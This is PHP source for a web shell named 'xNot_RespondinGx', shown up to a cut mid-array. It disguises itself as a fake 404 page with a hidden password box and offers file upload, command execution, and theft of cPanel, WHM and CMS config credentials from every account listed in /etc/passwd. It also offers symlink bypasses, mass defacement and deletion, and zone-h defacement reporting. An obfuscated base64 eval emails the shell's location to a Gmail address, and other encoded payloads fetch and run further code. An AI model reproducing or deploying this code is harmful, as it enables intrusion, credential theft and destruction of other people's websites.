<?php
error_reporting(0);
set_time_limit(0);
session_start();

$Password = "f81f0ccab46dbb76f27fc7354cd05deb"; //root

if(isset($_POST[ShellPassword])){

if(md5($_POST[ShellPassword]) == $Password){

$_SESSION['shellPasswd'] = $Password;

}

}

if(!isset($_SESSION['shellPasswd'])){

header("HTTP/1.0 404 Not Found");

echo "<title>404 Not Found</title>";

echo "<h1>Not Found</h1>";

echo "<p>The requested URL /01.php ".$PHP_SELF." was not found on this server.</p><hr>";

echo "<address>Apache Server at ".$_SERVER['HTTP_HOST']." Port 80</address>";

echo "

<form method='POST'>

<input type='password' name='ShellPassword' style='border:none;background:#fff;outline:none;position:fixed;bottom:0;right:0;font-size:20px;'>

</form>

";

exit();

}

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>

<link href="https://fonts.googleapis.com/css?family=Supermercado+One&display=swap" rel="stylesheet">
<title></title>
<style>
body{
font-family:Supermercado One, sans-serif;
background-color: #000022;
background-image: url();
background-size: center; background-repeat:no-repeat; background-attachment: fixed; background-size: cover; background-position:center;
color: white;
}
#content tr:hover{
background-color: black;
text-shadow:0px 0px 10px black;
}
#content .first{
background-color: white;
}
table{
border: 1px #000000 dotted;
}
a{
color: #00FF66;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.lazy {
  margin: 0;
  font-family:Supermercado One;
}
</style>
</head>
</body>
<body>
<h1><center><font color="white" face=""><div class="lazy">xNot_RespondinGx</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';	if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$kernel = php_uname();
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=#00FF66>Gak onok</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "Server IP : <font color=#00FF66>".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<br>Disable Functions : $show_ds<br>";
echo "System : <font color=#00FF66>".$kernel."</font><br>";
echo "<center>";
echo "<hr>";
echo "[ <a href='?'>Home</a> ]";
echo "[ <a href='?dir=$dir&do=cmd'>Command</a> ]";
echo "[ <a href='?dir=$dir&to=sym'>Symlink</a> ]";
echo "[ <a href='?dir=$dir&symlink=404'> 404</a> ]";
echo "[ <a href='?dir=$dir&symlink=python'>Python</a> ]";
echo "[ <a href='?dir=$dir&do=config'>Config</a> ]";
echo "[ <a href='?dir=$dir&config=grabber'>Config 2</a> ]";
echo "[ <a href='?dir=$dir&jancok=adminer'>Adminer</a> ]";
echo "[ <a href='?dir=$dir&amp;bypass=vhosts'>Vhosts</a> ]";
echo "[ <a href='?dir=$dir&do=mass_deface'>Mass</a> ]";
echo "[ <a href='?dir=$dir&do=mass_delete'>Hapus</a> ]";
echo "[ <a  href='?dir=$dir&do=jumping'>Loncat</a> ]";
echo "[ <a href='?dir=$dir&do=zoneh'>Jones</a> ]";
echo "[ <a href='?dir=$dir&kill=self'>bundir</a> ]";
echo "</center>";
echo "<hr>";
echo "<tr><td><font color='white'>Path :</font> ";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$buffs = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIkJhcnUgc2FqYSBkaSBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gImRpcmVjdG9yeTogJHRhcmdldCBieTogJHZpc2l0b3IgcGFzc3dvcmQ6ICRhdXRoX3Bhc3MiOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJrYWRhbGpvZ2luZzY5QGdtYWlsLmNvbSIsJGp1ZHVsLCRib2R5LCRhdXRoX3Bhc3MpOyB9DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHMiLCR2aXNpdGMpOw=="; 
eval(base64_decode($buffs));
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Sukses Cook!!!</font><br />';
}else{
echo '<font color="red">Gagal Cook!!!</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="Sikaat" />
</form>
</td></tr>';
if($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/mass");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='xNot_RespondinGx'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
}
if($_GET['do'] == 'config') {
    $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
    $idx = mkdir("xNot_config", 0777);
    $isi_htc = "Options all\nRequire None\nSatisfy Any";
    $htc = fopen("xNot_config/.htaccess","w");
    fwrite($htc, $isi_htc);
    while($passwd = fgets($etc)) {
        if($passwd == "" || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach($user_config[1] as $user_idx) {
                $user_config_dir = "/home/$user_idx/public_html/";
                if(is_readable($user_config_dir)) {
                    $grab_config = array(
                        "/home/$user_idx/.my.cnf" => "cpanel",
                        "/home/$user_idx/.accesshash" => "WHM-accesshash",
                        "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
                        "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
                        "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/forum/config.php" => "phpBB",
                        "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
                        "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
                        "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
                        "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
                        "/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
                    foreach($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if($ambil_config == '') {
                        } else {
                            $file_config = fopen("xNot_config/$user_idx-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }      
            }
        }  
    }
    echo "<center><a href='?dir=$dir/xNot_config'><font color=silver>Done</font></a></center>";
}
if($_GET['jancok'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('eki.php')) {
		echo "<center><font color=white><a href='$full/eki.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://raw.githubusercontent.com/xNotRespondinGx/kontl/master/adminer.php","eki.php")) {
			echo "<center><font color=white><a href='$full/eki.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}
if($_GET['bypass'] == 'vhosts'){
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
	echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
		if (isset($_POST['Colii'])){
                        mkdir('symvhosts', 0755);
                        chdir('symvhosts');
                        system('ln -s / xNot.txt');
			$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","xNot.txt");
			$rt="<br><a href=symvhosts/xNot.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt<br>Note: Apabila Forbidden pas buka /var/www/vhosts/Domain.com/ harap tambahkan httpdocs ex:/var/www/vhosts/Domain.com/httpdocs/</center>";} echo "</form>";
}
if($_GET['symlink'] == 'python') {
	$sym_dir = mkdir('xNot_sympy', 0755);
        chdir('xNot_sympy');
	$file_sym = "sym.py";
	$sym_script = "nVRNb9s4ED3HgP8Dy0VgO3GkpB9bwJEMtCm6LbDFBs3eiqKgxFHENUUKJL22ctjfvjOUJbdNe6kP0nDmcT7ePPm39Oy2C7U108l0oprWusCCamA8WD+avjvaDuiC9Qk6AzRzXlptHbvhC/LXQbCccfNWaWArluC5LMF7lqbsxoEIINndNrqqrdbdE8Onk4quvNKa3TpLEfDsjTXwxNx1jVZmw153rUD3D662TpmA9Y7mf/zs98vx9G0G9vTy6jkrOvZBGamprffmHygD9n9MwL753bVQKqHZHw4gPLBgcapbsWE3XQGO3W2wk4dHxSM/jdiAVM7PZ4Xbyq32XdN2s0WMlTVGHgWmE7/1Lv/0GQ0VYB+tr5jWhl0gk6y/loR9OJBO/P3VBmUNTSRhjwy+tVrbHc7/J87vzRvl4qBdjA8p2jo02ryS8u+uBYYJGbpacrwTxJAbfThjg2VsC2bOx7XyJd+dUxNNsnPY8ryOdqmth/lioAXRcbi454xKrrOggob1sJ5eiVnae7MSTAC3ziqLt6O+8l2N6ZlXD5C/WD/e6susGPAR83z9QUhAwA9WTdCPUFqJgkLAjTUvYR+ylG6vh1fx0/LPsHlRYJs8LnogZZZCKFPqZydny5mLm85tgqKXRAUBHSQVtiO0RnhtG0h357OljUussLM9rp8pw+xqOjmhQ04PTNFqUcJwB7NT8hMSSyJaLC7nhBv55hf87BnKcE8qov58opUPJDme/itcakQDkh/L9kAsHI1YPFp5/xob4IkscOU8VieFjuUjbmygQkOEOsfC98jKLhKgKsbTdltoVX4hDaScKhKOCkb8d/HpBLSHIUriSYdAabckkfwK87Y+72X5tahJmdQnRg/S9NU4cHXgmRik9NE3cBAHI+9Jtc0J+ely9eIznX0eQeMZJ0JI7iP45FiJZ4WVHSvue+0UyN0GRYOKCpL50GnISVoXlWiU7lal0Kpw6jr6dqDu67AqrJbX8foqSu96ferx85C/lsKB/NUE60yw2kGVH/90ehWe+lPPgnC44PwLjoifYywh1rEMP50fdrQkDvsHrXEZOVwsImfDGg/v86v/AQ==";
        $sym = fopen($file_sym, "w");
	fwrite($sym, gzinflate(base64_decode($sym_script)));
	chmod($file_sym, 0755);
        $jancok = exe("python sym.py");
	echo "<br><center>Done ... <a href='xNot_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
}
if($_GET['kill'] == 'self') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>xNot_RespondinGx Always Gans :v</h2></center></center>');
		else
			echo '<center>unlink failed!</center>';
}
if($_GET['do'] == 'mass_delete') {
   function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
   $dira = scandir($dir);
   foreach($dira as $dirb) {
       $dirc = "$dir/$dirb";
       $lokasi = $dirc.'/'.$namafile;
       if($dirb === '.') {
           if(file_exists("$dir/$namafile")) {
               unlink("$dir/$namafile");
           }
       } elseif($dirb === '..') {
           if(file_exists("".dirname($dir)."/$namafile")) {
               unlink("".dirname($dir)."/$namafile");
           }
       } else {
           if(is_dir($dirc)) {
               if(is_writable($dirc)) {
                   if(file_exists($lokasi)) {
                       echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
                       unlink($lokasi);
                       $idx = hapus_massal($dirc,$namafile);
                   }
               }
           }
       }
   }
}
   }
   if($_POST['start']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
hapus_massal($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
   } else {
   echo "<center>";
   echo "<form method='post'>
   <font>Folder :</font><br>
   <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
   <font>Filename :</font><br>
   <input type='text' name='d_file' value='zz.php' style='width: 450px;' height='10'><br>
   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
   </form></center>";
   }

##JUMPING 
}
if(isset($_GET['do']) && ($_GET['do'] == 'mass_deface')){
	function sabun_massal($dir,$namafile,$isi_script) {
		foreach($j as $lokasi)
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							
							echo "[<font color=#52CF38>Selesai</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#52CF38>Selesai</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font>Type  Sabun :</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font>Folder :</font><br>
	<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
	<font>Filename :</font><br>
	<input type='text' name='d_file' value='zz.php' style='width: 450px;' height='10'><br>
	<font>Index File :</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'><center>Hacked By xNot_RespondinGx | ProblemCyberTeam <br><center>Indonesian Hacker Rulez</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
	}elseif($_GET['to'] == 'sym') {
echo '<hr>';
eval(gzinflate(base64_decode('7Vf/T9tGFP89Uv6H1yOT7ZHaSVDXisQpXWFapQ0koNskVEWOfcYeF591d8GklP99785fSPMFVFppm1QkIud99/vyeS+deM4Y+CCVmAiasyCkdmdydnT6x9HphXV48vb970fH55PTk5Nz60MXCOlCJw9U4gzbrU7UmwVpJlH9IE4ZtYlHVehlwYxGbsizmGipnZ1EKTQr2600tmsd57bdOphdRamwyc0xVxO5mJFu7+XLl1rnIEw+5xgivaGhTVgGzyV4IDhXht7RvvcwCOskVynHeN5lEcpK+IUzxouzxey3NLtC/4epoKHiYmEEQFt3EzVrt95E0fkip6DojfIwCWkGbp7kYDi/BlnEqFhltltngUplvIA32cIyceQ6ipjnNLMtNByE+NbS6lqFVcZZGH4hUoVJRuluGbozPIhDxmVJ1KI0TDiQdmukgimjELD0MvNDmikMY8pFRIW/hyVbMOpbRRqpZP+n3g/DkvM85IyL/Z1XP/fwb2iNtRlhPqPPLI1HMc8UGHGfpTMKMv1I/cH4zIVj7o48zR6PPBV9ifIhN/V9ovZ7ScVTdbHODOu8ou3huxPTrCGfo54PffwWc0GDMGnaEQIJ1bPuTGxUKuhlapOPPKOkW7Oc2xzJk1mgwmQSMGZbO1oAiO3+6JAdq1sb0Q9lInQ5YzaXia2f0DBOGsMGUSKd2bXQRf/DRe+D48AYBtp/Z455wFBzLtObySVVeTFPI9tMGS8yKqpRu8bEBJJKj7irppouwuKv5A8TU+awShwBF+r0uKiwJf2MxkgNIBE09nGm833PK4rCXfXtEq+uEQuk9NWNGq/LNF6CJU9aTr/6haVBxDJiDa92bXU0Znk1NngaCLyEz6i3pu3l8ylLwwkOObNABQJT6VuTKQuyK2styNUGqiKrWgiW61ila3d3eHd312TaM+Nq2u2OMkl1Jc+Pzs79Eh4tU7Mc3RWRVXYD2EbgCWj4HwdDeAwN4QE4RO4qIkINifAAJvbHJdLBFsww/b63Ed8eUdmAS485WUejBovgczAC895NsshSm+C6JYI4wAXQm1TZ5H1m3l5x0LKgFZ+ZwkOR6B57FlOOW1bTHd1V0NHrOca+lxXVODQIRjUrECJY2CVVB3QPcNivHuLaawfnXGpok91GcdXK8vlAylns4q1QS+DQG417+GsMIeT1B/DpE6wxfB96mnHvxgcyTTOyRtT5+qvf92K5zrsOhMfSqZdtYwYiLzRpM/eS5wkV6zy5MRBjL5qtM+YSTSEobYkhVvnmt8o2MbQGAu9mhrm+iIPJxgtMpdmc3k+Pno6HunbDKniw1ZfwXevVodSKZNnzIwZqcN+O7SselqF9Ddmb4Qu2TJ4G7gZh6qlYRfESw/XRyiU8w/z+mWYRLyRxbreB9Qao1mfrGlDfwzT6/UKk7vVefQOQbre+GqYfwOi6ysmgqrF1NWBsby8aNMWBMyquqRh5yWD8TWD93eG/CumKznJMFCHDDp5lfXzsmaeBRnl9iaMQnp12xR75YLjl191dB247eOPp31IrV58RqOAT7wUkOaUz14e/eYpl27e6huySDLu2LoQ1mgpvbA3ryMqLU3+p+u8FEk1QZusoKpWLo4jAXZQbJc7n9dZ40a0UNXlpbl6gqaVdVi+yTVa/apGtb7FvsMK+76/v++t/vL9WRnHDCht5UXqNn1XMZDjPtNmlqTRKd6AXHdyrbwK/t0GWcXxj/N2sKKxCYeNBmyv/X4//AQ==')));
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}
if($_GET['config'] == 'grabber') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
	if($_POST){	if($_POST['config'] == 'symvhosts') {
		@mkdir("xNot_symvhosts", 0777);
exe("ln -s / xNot_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("xNot_symvhosts/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php xNot_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php xNot_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php xNot_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php xNot_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php xNot_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php xNot_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml xNot_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php xNot_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php xNot_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("xNot_Symconfig", 0777);
@symlink("/","xNot_Symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("xNot_Symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("xNot_sym404", 0777);
@symlink("/","xNot_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*xNot_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("xNot_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
						mkdir("xNot_configgrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("xNot_configgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_con7ext) {
$grab_config = array(
"/home/$user_con7ext/.accesshash" => "WHM-accesshash",
"/home/$user_con7ext/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_con7ext/public_html/forum/config.php" => "phpBB",
"/home/$user_con7ext/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_con7ext/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_con7ext/public_html/app/etc/local.xml" => "Magento",
"/home/$user_con7ext/public_html/admin/config.php" => "OpenCart",
"/home/$user_con7ext/public_html/application/config/database.php" => "Ellislab",
"/home/$user_con7ext/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/inc/config.php" => "MyBB",
"/home/$user_con7ext/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/os/includes/configure.php" => "OsCommerce",
